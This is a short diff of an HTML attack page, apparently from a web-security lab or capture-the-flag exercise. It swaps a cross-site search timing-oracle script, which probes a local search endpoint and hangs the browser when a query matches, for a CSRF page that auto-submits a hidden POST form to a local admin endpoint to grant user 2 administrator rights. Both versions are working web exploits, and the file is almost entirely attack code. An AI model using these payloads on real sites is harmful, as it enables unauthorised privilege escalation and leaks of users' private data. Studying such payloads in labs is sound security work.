@@ -1,11 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="f" action="http://localhost:5000/admin/make_admin/2" method="POST">
+</form>
 <script>
-(async () => {
-  const query = new URLSearchParams(location.search).get("q");
-  const res = await fetch("http://127.0.0.1:8000/search?query=" + encodeURIComponent(query));
-  const text = await res.text();
-  if (text.includes(query)) {
-    // Force a long-running loop to cause timeout
-    while (1);
-  }
-})();
+document.getElementById('f').submit();
 </script>
+</body>
+</html>
